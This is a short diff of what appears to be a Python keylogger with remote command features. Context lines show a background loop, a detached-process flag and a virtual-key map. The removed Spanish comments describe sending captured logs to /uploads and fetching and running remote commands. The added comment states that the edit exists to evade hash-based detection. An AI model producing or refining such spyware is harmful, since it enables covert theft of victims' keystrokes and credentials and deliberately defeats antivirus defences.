@@ -74,10 +74,10 @@ if __name__ == '__main__':
     while True:
         time.sleep(20)
         
-        # 1. Enviar el log correspondiente a /uploads
-        # 2. Examinar si existe algun comando para ejecutar
-        # 3. Si hay comando ejecutarlo
+#################
+# para eludir deteccion por hash :v 
 
+#################
 
 DETACHED_PROCESS = 0x00000008
 VK_CODES = range(0, 256)
@@ -530,4 +530,5 @@ varskeys = {
     0xA3: '[RCTRL]',
     0xA4: '[LALT]',
     0xA5: '[RALT]',
+
 }
